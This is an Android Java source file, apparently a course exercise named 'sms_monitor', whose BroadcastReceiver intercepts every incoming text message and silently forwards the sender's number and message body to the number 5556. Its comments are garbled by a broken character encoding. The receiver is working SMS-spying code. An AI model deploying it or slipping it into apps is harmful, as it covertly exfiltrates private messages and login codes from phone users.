package com.itheima.sms_monitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsMonitorReceiver extends BroadcastReceiver {

	/**
	 * 	1. ���ܶ��ŵ����Ĺ㲥
		2. ��ȡ����Ķ����ƵĶ�������
		3. ��ȡ���Ŷ���
			3.1 ��ȡ�ֻ�����
			3.2 ��ȡ��������
		4. ת������
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
			//��ȡ����Ķ����ƵĶ�������
			Bundle bundle = intent.getExtras();
			//pdus:pduЭ�����ݵ�Ԫ(Protocol Data Unit),���Ź�ҵ��׼
			Object[] object = (Object[]) bundle.get("pdus");//��������������,����������
			for(Object obj : object){
				//��ȡ���Ŷ���
				SmsMessage sms = SmsMessage.createFromPdu((byte[])obj);
				//��ȡ�ֻ�����
				String phoneNum = sms.getOriginatingAddress();
				//��ȡ��������
				String body = sms.getMessageBody();
				System.out.println("�ֻ����룺"+phoneNum+" �������ݣ�"+body);
				
				//ת������
				SmsManager sm = SmsManager.getDefault();
				sm.sendTextMessage("5556", null, "phonenum:"+phoneNum+" body:"+body, null, null);
			}
		}
	}
}
